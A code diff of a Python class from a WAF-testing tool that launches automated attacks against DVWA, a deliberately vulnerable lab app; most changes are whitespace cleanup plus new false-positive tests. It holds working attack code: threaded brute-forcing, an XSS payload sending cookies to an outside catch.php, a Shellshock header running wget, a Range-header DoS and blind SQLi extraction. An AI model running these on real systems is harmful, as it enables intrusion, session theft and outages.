@@ -2,7 +2,7 @@
     This is the DVWAAttacks class file. This is where all of the black magic
     happens. Everything built into this class set of functions was manually
     tested and verified prior to being included here in its automated fashion.
-    
+
     License:
     assay
     Copyright (C) 2010 - 2015 Bayshore Networks, Inc.
@@ -48,7 +48,7 @@ from urllib2 import URLError
     functions of this class
 """
 class DVWAAttacks:
-    
+
     """
         Constructor
         Should be self explanatory
@@ -63,7 +63,7 @@ class DVWAAttacks:
         self.bruteArr = []
         self.prefix = ""
         self.htmlgen = HTMLGenerator(targeturl=targeturl)
-        
+
     def sanitizeVector(self, vect="", xss=False):
         pvect = ""
         if vect.startswith("<"):
@@ -76,7 +76,7 @@ class DVWAAttacks:
         if xss:
             if 'http' in pvect:
                 pvect = "non-printable"
-            
+
         return pvect
 
     def setHTMLFilePrefix(self, val=0):
@@ -84,12 +84,12 @@ class DVWAAttacks:
             self.prefix = "pre_"
         if val == 1:
             self.prefix = "post_"
-    
+
     def saveHTML(self):
         fh = vars.getHtmlPath() + self.prefix + vars.getHtmlFileName() + funcs.getTimeStamp() + vars.getHtmlFileExt()
         self.htmlgen.saveHTML(fhandle=fh,keyval=vars.typecount)
         funcs.attackOutPut(funcs.stepOne, "info", "HTML was written to file: %s" % fh)
-        
+
     def writeWafHtml(self, val=""):
         if val:
             self.htmlgen.writeHtmlTableCell(success=True, attackType="Recon",
@@ -97,10 +97,10 @@ class DVWAAttacks:
         else:
             self.htmlgen.writeHtmlTableCell(success=False, attackType="Recon",
                                             target=self.url, vect="WAF Vendor not detected")
-    
+
     """
         for some of the browser displayed attacks to
-        be successful we need an authenticated 
+        be successful we need an authenticated
         browser instance out there, so this kicks
         that off
     """
@@ -146,7 +146,7 @@ class DVWAAttacks:
             wbs = m.hexdigest()
         except:
             pass
-        
+
         try:
             # do a sqli
             msql = hashlib.md5()
@@ -155,7 +155,7 @@ class DVWAAttacks:
             wbsql = msql.hexdigest()
         except:
             pass
-    
+
         try:
             # do an xss
             mxss = hashlib.md5()
@@ -169,10 +169,10 @@ class DVWAAttacks:
             so if this var is not None then we have detected that a
             redirect by a WAF is in place
         """
-        if wbs and wbsql and wbsxss:  
+        if wbs and wbsql and wbsxss:
             if wbs == wbsql and wbs == wbsxss and wbsql == wbsxss:
                 self.wafbaseline = wbs
-                return        
+                return
         if wbs and wbsql:
             if wbs == wbsql:
                 self.wafbaseline = wbs
@@ -205,9 +205,9 @@ class DVWAAttacks:
 
         return False
     # EOF
-    
+
     """
-    
+
     """
     def bruteAttack(self, cru='', user='', crp='', psw='', fp='', targetpage=''):
         for p in psw:
@@ -222,7 +222,7 @@ class DVWAAttacks:
     """
         attackbrute covers areas of:
         OWASP Top 10 - A3: Broken Authentication and Session Management
-        
+
         This is a standard brute-force test against an instance
         of the DVWA login form. The actual brute-force attemtps
         are staggered so as not to give away a steady pattern of attempts.
@@ -241,17 +241,17 @@ class DVWAAttacks:
         discattacks = []
 
         credresp = funcs.doLoginFormDiscovery(targetpage)
-        
+
         # get passes
         file2 = open(vars.getStaticPath() + "passwdz")
         lines2 = file2.readlines(1000)
         lines2 = [x.strip() for x in lines2]
-        
-        
+
+
         #with open('userz') as userz:
             #for u in userz:
                 #u = u.strip()
-                
+
         #file = open("userz")
         #lines = file.readlines(1000)
         #lines = [x.strip() for x in lines]
@@ -260,7 +260,7 @@ class DVWAAttacks:
         # admin
         a = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[0],credresp['passwd'],lines2,fp,targetpage,))
         a.daemon = True
-        a.start() 
+        a.start()
         # test
         b = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[1],credresp['passwd'],lines2,fp,targetpage,))
         b.daemon = True
@@ -289,7 +289,7 @@ class DVWAAttacks:
         h = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[7],credresp['passwd'],lines2,fp,targetpage,))
         h.daemon = True
         h.start()
-        
+
         a.join()
         b.join()
         c.join()
@@ -302,9 +302,9 @@ class DVWAAttacks:
         if len(self.bruteArr) > 0:
             return self.bruteArr
         else:
-            return None        
+            return None
     # EOF
-    
+
     """
         attackexposesession covers areas of:
         OWASP Top 10 - A3: Broken Authentication and Session Management
@@ -313,7 +313,7 @@ class DVWAAttacks:
         data can get stolen or leaked out. These 2 demo's are both
         browser based due to the dependence on javascript.
         Attack vector in the clear
-        
+
         <script>new Image().src="http://sec.neurofuzz-software.com/e4589efff654d91e26b43333dbf41425/catch.php?cookie="+encodeURI(document.cookie);</script>
     """
     def attackexposesession(self, fp, targetpage):
@@ -343,7 +343,7 @@ class DVWAAttacks:
             funcs.attackOutPut(funcs.stepThree, "step", "Attempting to leak Session ID data via XSS")
             if vars.getUseBrowser():
                 webbrowser.open(self.url + self.apppath + "vulnerabilities/xss_r/?name=%3Cscript%3Enew+Image%28%29.src%3D%22" + vars.exturl + vars.extpath + "catch.php%3Fcookie%3D%22%2BencodeURI%28document.cookie%29%3B%3C%2Fscript%3E")
-            
+
             stamp = funcs.createRandAlpha(length=30)
             response = ""
             encoded = ""
@@ -359,7 +359,7 @@ class DVWAAttacks:
                 time.sleep(8)
             except:
                 pass
-            
+
             if vars.getUseBrowser():
                 webbrowser.open(vars.getExtUrl() + "catch.php", new=2, autoraise=True)
                 funcs.attackOutPut(funcs.stepThree, "step", "A browser window/tab should have opened up with leaked session data in an external page")
@@ -440,7 +440,7 @@ class DVWAAttacks:
 
     """
         attackcsrf covers areas of:
-        OWASP Top 10 - A5: Cross-Site Request Forgery (CSRF) 
+        OWASP Top 10 - A5: Cross-Site Request Forgery (CSRF)
 
         CSRF demo utilizing the browser and hitting a remote page
     """
@@ -550,36 +550,90 @@ class DVWAAttacks:
         discattacks = []
         pvect = ""
 
-        with open(vars.getStaticPath() + 'sqli.txt') as vectorz:
-            # iterate thru vectors
-            for p in vectorz:
-                # split vector up based on delimiter :::
-                p = p.split(":::")[0]
-                pvect = self.sanitizeVector(vect=p)
+        #Normalize the vectors into a list to avoid duplicates
+        vectorz = funcs.normalizeVectorList(vars.getStaticPath() + vars.getSqlInjectionPath() )
 
-                tstr = funcs.formSubmit(fp, targetpage, 0, {"id":p}, sleep=False)
-                vars.typecount['sqli'][0] += 1
-                if not regErr.search(tstr):
-                    if regSQLi.search(tstr):
-                        discattacks.append(p)
-                        #print "\n\n**********SQLi: %s\n\n" % p
-                        vars.typecount['sqli'][1] += 1
-                        self.htmlgen.writeHtmlTableCell(success=True, attackType="SQLi",
-                                                target=targetpage, vect=pvect)
-                    else:
-                        vars.typecount['sqli'][2] += 1
-                        self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
-                                                target=targetpage, vect=pvect)
+        # iterate thru vectors
+        for p in vectorz:
+            # split vector up based on delimiter :::
+            p = p.split(":::")[0]
+            pvect = self.sanitizeVector(vect=p)
+
+            tstr = funcs.formSubmit(fp, targetpage, 0, {"id":p}, sleep=False)
+            vars.typecount['sqli'][0] += 1
+            if not regErr.search(tstr):
+                if regSQLi.search(tstr):
+                    discattacks.append(p)
+                    #print "\n\n**********SQLi: %s\n\n" % p
+                    vars.typecount['sqli'][1] += 1
+                    self.htmlgen.writeHtmlTableCell(success=True, attackType="SQLi",
+                                            target=targetpage, vect=pvect)
                 else:
                     vars.typecount['sqli'][2] += 1
                     self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
                                             target=targetpage, vect=pvect)
+            else:
+                vars.typecount['sqli'][2] += 1
+                self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
+                                        target=targetpage, vect=pvect)
 
         if len(discattacks) > 0:
             return discattacks
         else:
             return None
     # EOF
+
+    """
+        anti_sqli:
+
+        Puts in vectors that may look like a sql-injection attack but should not
+        trigger a block by the security device.
+    """
+    def attackanti_sqli(self, fp, targetpage):
+        sqlisuccessstr = "First"
+        # compile regex for success based on the dvwa page
+        # displaying the attack vector, this means the
+        # injection was successful
+        regSQLi = re.compile(sqlisuccessstr,re.I+re.MULTILINE)
+        # error regex for false positives when MySQL throws
+        # a syntax error
+        regErr = re.compile("error",re.I+re.MULTILINE)
+        discattacks = []
+        pvect = ""
+
+        #Normalize the vectors into a list to avoid duplicates
+        vectorz = funcs.normalizeVectorList(vars.getStaticPath() + vars.getAntiSqliPath() )
+
+        # iterate thru vectors
+        for p in vectorz:
+            pvect = self.sanitizeVector(vect=p)
+
+            tstr = funcs.formSubmit(fp, targetpage, 0, {"id":p}, sleep=False)
+            vars.typecount['anti_sqli'][0] += 1
+            if not regErr.search(tstr):
+                print tstr
+                if regSQLi.search(tstr):
+                    discattacks.append(p)
+                    #print "\n\n**********SQLi: %s\n\n" % p
+                    vars.typecount['anti_sqli'][1] += 1
+                    self.htmlgen.writeHtmlTableCell(success=True, attackType="SQLi",
+                                            target=targetpage, vect=pvect)
+                else:
+                    vars.typecount['anti_sqli'][2] += 1
+                    self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
+                                            target=targetpage, vect=pvect)
+            else:
+                vars.typecount['anti_sqli'][2] += 1
+                self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
+                                        target=targetpage, vect=pvect)
+
+        if len(discattacks) > 0:
+            return discattacks
+        else:
+            return None
+    # EOF
+
+
 
     """
         attacksqli_blind covers areas of:
@@ -597,7 +651,7 @@ class DVWAAttacks:
         #targetpage = targetpage + "/"
         """
             SK seems to reply with this when it blocks:
-            
+
             Error in form submit: HTTP Error 500: ...
         """
         errfailstr = "Error"
@@ -711,7 +765,7 @@ class DVWAAttacks:
                     vars.typecount['sqli_blind'][2] += 1
                     self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                             target=targetpage, vect=injection)
-                
+
                 if len(pool) == nlength:
                         raise StopIteration()
         except StopIteration:
@@ -935,7 +989,7 @@ class DVWAAttacks:
                 vars.typecount['sqli_blind'][2] += 1
                 self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                         target=targetpage, vect=injection)
-                
+
         if len(fieldnames) > 0:
             funcs.attackOutPut(funcs.stepFour, "discovered", "DB field names discovered:")
             for f in fieldnames:
@@ -1006,10 +1060,10 @@ class DVWAAttacks:
         """
         possibleuser = difflib.get_close_matches('user', fieldnames)
         possiblepasswd = difflib.get_close_matches('password', fieldnames)
-        
+
         """
-            difflib - The best (no more than n) matches among the 
-            possibilities are returned in a list, sorted by similarity 
+            difflib - The best (no more than n) matches among the
+            possibilities are returned in a list, sorted by similarity
             score, most similar first.
         """
         if len(possibleuser) >= 1:
@@ -1112,7 +1166,7 @@ class DVWAAttacks:
                             is enforced client-side
                         '''
                         fp[k] = '1000000000'
-    
+
                     #filehandle = open(mpath + f)
                     filehandle = open(f)
                     fp.form.add_file(filehandle, None, fName)
@@ -1139,7 +1193,7 @@ class DVWAAttacks:
                     vars.typecount['upload'][2] += 1
                     self.htmlgen.writeHtmlTableCell(success=False, attackType="Malicious Upload",
                                                     target=targetpage, vect=fName)
-        
+
         else:
             return None
 
@@ -1167,32 +1221,34 @@ class DVWAAttacks:
             between those tags that means the attack vector
             was successful
         """
-        discattacks = []        
+        discattacks = []
         pvect = ""
 
-        with open(vars.getStaticPath() + 'xss.txt') as vectorz:
-            # iterate thru vectors
-            for p in vectorz:
-                # split vector up based on delimiter :::
-                p = p.split(":::")[0]
-                pvect = self.sanitizeVector(vect=p, xss=True)
+        #Normalize the vectors into a list to avoid duplicates
+        vectorz = funcs.normalizeVectorList( vars.getStaticPath() + vars.getXssPath() )
 
-                tstr = funcs.formSubmit(fp, targetpage, 0, {"name":p}, sleep=False)
-                vars.typecount['xss_r'][0] += 1
-                if p in tstr:
-                    '''
-                    print p
-                    print tstr
-                    '''
-                    discattacks.append(p)
-                    #print "\n\n**********XSS: %s\n\n" % p
-                    vars.typecount['xss_r'][1] += 1
-                    self.htmlgen.writeHtmlTableCell(success=True, attackType="XSS",
-                                            target=targetpage, vect=pvect)
-                else:
-                    vars.typecount['xss_r'][2] += 1
-                    self.htmlgen.writeHtmlTableCell(success=False, attackType="XSS",
-                                            target=targetpage, vect=pvect)
+        # iterate thru vectors
+        for p in vectorz:
+            # split vector up based on delimiter :::
+            p = p.split(":::")[0]
+            pvect = self.sanitizeVector(vect=p, xss=True)
+
+            tstr = funcs.formSubmit(fp, targetpage, 0, {"name":p}, sleep=False)
+            vars.typecount['xss_r'][0] += 1
+            if p in tstr:
+                '''
+                print p
+                print tstr
+                '''
+                discattacks.append(p)
+                #print "\n\n**********XSS: %s\n\n" % p
+                vars.typecount['xss_r'][1] += 1
+                self.htmlgen.writeHtmlTableCell(success=True, attackType="XSS",
+                                        target=targetpage, vect=pvect)
+            else:
+                vars.typecount['xss_r'][2] += 1
+                self.htmlgen.writeHtmlTableCell(success=False, attackType="XSS",
+                                        target=targetpage, vect=pvect)
 
         if len(discattacks) > 0:
             return discattacks
@@ -1208,29 +1264,80 @@ class DVWAAttacks:
         form in the hopes of getting stored in the DB.
     """
     def attackxss_s(self, fp, targetpage):
-        
+
         discattacks = []
         pvect = ""
 
-        with open(vars.getStaticPath() + 'xss.txt') as vectorz:
-            # iterate thru vectors
-            for p in vectorz:
-                # split vector up based on delimiter :::
-                p = p.split(":::")[0]
-                pvect = self.sanitizeVector(vect=p, xss=True)
+        #Normalize the vectors into a list to avoid duplicates
+        vectorz = funcs.normalizeVectorList( vars.getStaticPath() + vars.getXssPath() )
 
-                tstr = funcs.formSubmit(fp, targetpage, 0, {"txtName":"test User", "mtxMessage":p}, sleep=False)
-                vars.typecount['xss_s'][0] += 1
-                if p in tstr:
-                    discattacks.append(p)
-                    #print "\n\n**********XSS: %s\n\n" % p
-                    vars.typecount['xss_s'][1] += 1
-                    self.htmlgen.writeHtmlTableCell(success=True, attackType="XSS",
-                                            target=targetpage, vect=pvect)
-                else:
-                    vars.typecount['xss_s'][2] += 1
-                    self.htmlgen.writeHtmlTableCell(success=False, attackType="XSS",
-                                            target=targetpage, vect=pvect)
+        # iterate thru vectors
+        for p in vectorz:
+            # split vector up based on delimiter :::
+            p = p.split(":::")[0]
+            pvect = self.sanitizeVector(vect=p, xss=True)
+
+            tstr = funcs.formSubmit(fp, targetpage, 0, {"txtName":"test User", "mtxMessage":p}, sleep=False)
+            vars.typecount['xss_s'][0] += 1
+            if p in tstr:
+                discattacks.append(p)
+                #print "\n\n**********XSS: %s\n\n" % p
+                vars.typecount['xss_s'][1] += 1
+                self.htmlgen.writeHtmlTableCell(success=True, attackType="XSS",
+                                        target=targetpage, vect=pvect)
+            else:
+                vars.typecount['xss_s'][2] += 1
+                self.htmlgen.writeHtmlTableCell(success=False, attackType="XSS",
+                                        target=targetpage, vect=pvect)
+
+        if len(discattacks) > 0:
+            return discattacks
+        else:
+            return None
+    # EOF
+
+    """
+        attackanti_xss:
+
+        Puts in vectors that may look like xss attack but should not
+        trigger a block by the security device.
+    """
+    def attackanti_xss(self, fp, targetpage):
+        """
+            construct regex to detect a successful injection.
+            cmdsuccessstr is present after a POST that was
+            not successful as an attack, if there is data
+            between those tags that means the attack vector
+            was successful
+        """
+        discattacks = []
+        pvect = ""
+
+        #Normalize the vectors into a list to avoid duplicates
+        vectorz = funcs.normalizeVectorList( vars.getStaticPath() + vars.getAntiXSSPath() )
+
+        # iterate thru vectors
+        for p in vectorz:
+            # split vector up based on delimiter :::
+            p = p.split(":::")[0]
+            pvect = self.sanitizeVector(vect=p, xss=True)
+
+            tstr = funcs.formSubmit(fp, targetpage, 0, {"name":p}, sleep=False)
+            vars.typecount['anti_xss'][0] += 1
+            if p in tstr:
+                '''
+                print p
+                print tstr
+                '''
+                discattacks.append(p)
+                #print "\n\n**********XSS: %s\n\n" % p
+                vars.typecount['anti_xss'][1] += 1
+                self.htmlgen.writeHtmlTableCell(success=True, attackType="Anti_XSS",
+                                        target=targetpage, vect=pvect)
+            else:
+                vars.typecount['anti_xss'][2] += 1
+                self.htmlgen.writeHtmlTableCell(success=False, attackType="Anti_XSS",
+                                        target=targetpage, vect=pvect)
 
         if len(discattacks) > 0:
             return discattacks
@@ -1250,11 +1357,11 @@ class DVWAAttacks:
         """
             the redir URL will look something like this:
             # http://target/dvwa/vulnerabilities/redir/?token=aHR0cDovL3lvdXNob3VsZG5vdGJlaGVyZS5iYXlzaG9yZW5ldHdvcmtzLmNvbS5jb20vZTQ1ODllZmZmNjU0ZDkxZTI2YjQzMzMzZGJmNDE0MjUveW91c2hvdWxkbm90YmVoZXJlLnBocA==
-            
+
             where the token value:
-                
+
                 'aHR0cDovL3lvdXNob3VsZG5vdGJlaGVyZS5iYXlzaG9yZW5ldHdvcmtzLmNvbS9lNDU4OWVmZmY2NTRkOTFlMjZiNDMzMzNkYmY0MTQyNS95b3VzaG91bGRub3RiZWhlcmUucGhw'
-            
+
             equals: http://youshouldnotbehere.bayshorenetworks.com/e4589efff654d91e26b43333dbf41425/youshouldnotbehere.php
         """
         funcs.attackOutPut(funcs.stepThree, "step", "Attempting use a browser window/tab to simulate a redirect outside the target application")
@@ -1267,43 +1374,43 @@ class DVWAAttacks:
 
         return "attackredir"
     # EOF
-    
+
     """
-    
+
     """
     def attackdownload(self, fp, targetpage):
         # modify target page
         targetpage = vars.getUrl() + vars.getHackableUploadPath()
         results = []
         flist = None
-        
+
         try:
             flist = funcs.getServerMalwareList(fp, targetpage)
         except:
             pass
-            
+
         if flist:
             for f in flist:
                 dfile = ""
                 tpage = targetpage + f
-    
+
                 try:
                     dfile = fp.retrieve(tpage)[0]
                 except:
                     continue
-                
+
                 # make sure we get content back from site
                 if dfile:
                     # make sure we have content to compare with
                     if vars.download_file_sigs.has_key(f):
                         vars.typecount['download'][0] += 1
-                        
+
                         m = hashlib.md5()
                         fl = open(dfile, 'r')
                         m.update(fl.read())
                         fhex = m.hexdigest()
                         fl.close()
-                        
+
                         if vars.download_file_sigs[f] == fhex:
                             results.append("Malware: \"%s\" (%s) downloaded" % (f,fhex))
                             vars.typecount['download'][1] += 1
@@ -1313,13 +1420,13 @@ class DVWAAttacks:
                             vars.typecount['download'][2] += 1
                             self.htmlgen.writeHtmlTableCell(success=False, attackType="Malware Download",
                                                             target=tpage, vect=f)
-                            
-                            
+
+
         if len(results) > 0:
             return results
         else:
             return None
-        
+
     def apache_range_header_dos(self, fp='', req_headers=''):
         targetpage = vars.getUrl()
         '''
@@ -1335,7 +1442,7 @@ class DVWAAttacks:
         except:
             return 500
 
-        
+
     def attackrequest_headers(self, fp, targetpage):
         targetpage = vars.getUrl()
         discattacks = []
@@ -1344,7 +1451,7 @@ class DVWAAttacks:
         ########################################################################
         '''
             simple version of:
-            
+
             Apache Range Header DoS Attack
         '''
         vars.typecount['request_headers'][0] += 1
@@ -1356,7 +1463,7 @@ class DVWAAttacks:
                        'Accept-Encoding': 'gzip',
                        'Connection': 'close'
                        }
-        
+
         '''
         processes = [multiprocessing.Process(target=self.apache_range_header_dos, args=(fp,req_headers,)) for x in range(50)]
         # Run processes
@@ -1368,7 +1475,7 @@ class DVWAAttacks:
             p.join()
         '''
         the_resp = self.apache_range_header_dos(fp=fp, req_headers=req_headers)
-            
+
         dos_type = "Apache Range Header DoS Attack"
         the_vect = "Range: bytes=0-,5-0,5-1,5-2, ... 5-1294,5-1295,5-1296,5-1297,5-1298,5-1299 ..."
 
@@ -1390,21 +1497,21 @@ class DVWAAttacks:
             discattacks.append(the_vect)
             vars.typecount['request_headers'][1] += 1
             self.htmlgen.writeHtmlTableCell(success=True, attackType=dos_type,
-                                            target=targetpage, vect=the_vect)            
+                                            target=targetpage, vect=the_vect)
         ########################################################################
         ssv_header_attack = "Shellshock vector - HTTP Request Header Attack"
         wget_remote_file = "https://resources.bayshorenetworks.com/145eb731643f6f3516f2b5b41637a3dcc1a593404810a150f37f886195b2e2e3/bin_malicious_md5_hashes.MD5.txt"
-        
+
         tme = time.localtime()
         time_string = time.strftime("%m.%d.%y.%H:%M:%S", tme)
         wget_file_name = "shellshock_test_{}".format(time_string)
         wget_file_path = "%s%s" % (vars.dvwa_server_path, wget_file_name)
         targetpage = vars.getUrl() + "/cgi-bin/shellshock.cgi"
-        
+
         # shellshock vector
         shellshock_wget_vector = {"User-Agent":"() { :;}; /bin/bash -c \"wget --no-check-certificate -O %s %s\"" % (wget_file_path, wget_remote_file),
                                   "Content-Type":"text/plain"}
-                              
+
 
         vars.typecount['request_headers'][0] += 1
         '''
@@ -1415,20 +1522,20 @@ class DVWAAttacks:
             response = fp.open(request)
         except:
             pass
-        
+
         '''
         print response.info()
         print response.code
         '''
-        
+
         test_targetpage = vars.getUrl() + vars.getHackableUploadPath()
         flist = funcs.getServerMalwareList(fp, test_targetpage)
         shellshock_hit = False
         pvect = shellshock_wget_vector["User-Agent"]
-        
+
         if wget_file_name in flist:
             shellshock_hit = True
-                
+
         if shellshock_hit:
             discattacks.append(pvect)
             vars.typecount['request_headers'][1] += 1
@@ -1437,23 +1544,23 @@ class DVWAAttacks:
         else:
             vars.typecount['request_headers'][2] += 1
             self.htmlgen.writeHtmlTableCell(success=False, attackType=ssv_header_attack,
-                                            target=targetpage, vect=pvect) 
+                                            target=targetpage, vect=pvect)
         ########################################################################
         shellshock_wget_vector = {"User-Agent":"() { :;}; /bin/bash -c \"pwd\"", "Content-Type":"text/plain"}
 
         vars.typecount['request_headers'][0] += 1
-     
+
         response = ''
         #bad_header_regex = r"""(.*Bad header=.*)"""
         bad_header_regex = r"""(Bad header=.*)"""
         pvect = shellshock_wget_vector["User-Agent"]
-   
+
         try:
             request = urllib2.Request(targetpage, None, shellshock_wget_vector)
             response = fp.open(request)
         except:
             pass
-        
+
         '''
         print response.info()
         print response.code
@@ -1463,9 +1570,9 @@ class DVWAAttacks:
         match_bad_header = re.search(bad_header_regex, response.read())
         if response.code == 500 and match_bad_header:
             bad_hdr_line = match_bad_header.group(1)
-            
+
             print bad_hdr_line
-            
+
             discattacks.append(pvect)
             vars.typecount['request_headers'][1] += 1
             self.htmlgen.writeHtmlTableCell(success=True, attackType=ssv_header_attack,
@@ -1474,17 +1581,17 @@ class DVWAAttacks:
             vars.typecount['request_headers'][2] += 1
             self.htmlgen.writeHtmlTableCell(success=False, attackType=ssv_header_attack,
                                             target=targetpage, vect=pvect)
-        ########################################################################        
+        ########################################################################
         if len(discattacks) > 0:
             return discattacks
         else:
             return None
-        
+
     def attackbackdoor_access(self, fp, targetpage):
         backdoorpath, backdoors = vars.getBackdoorData()
         targetpage = vars.getUrl() + backdoorpath
         results = []
-        
+
         for f in backdoors:
             dfile = ""
             tpage = targetpage + f
@@ -1492,7 +1599,7 @@ class DVWAAttacks:
 
             fp.open(tpage)
             vars.typecount['backdoor_access'][0] += 1
-            
+
             if tstr in str(fp.response().read()):
                 results.append("Backdoor access achieved via '%s'" % tpage)
                 vars.typecount['backdoor_access'][1] += 1
@@ -1502,12 +1609,12 @@ class DVWAAttacks:
                 vars.typecount['backdoor_access'][2] += 1
                 self.htmlgen.writeHtmlTableCell(success=False, attackType="Backdoor Access",
                                                 target=tpage, vect=f)
-     
+
         if len(results) > 0:
             return results
         else:
             return None
- 
+
 
     """
         A wrapper function so that the calling end of
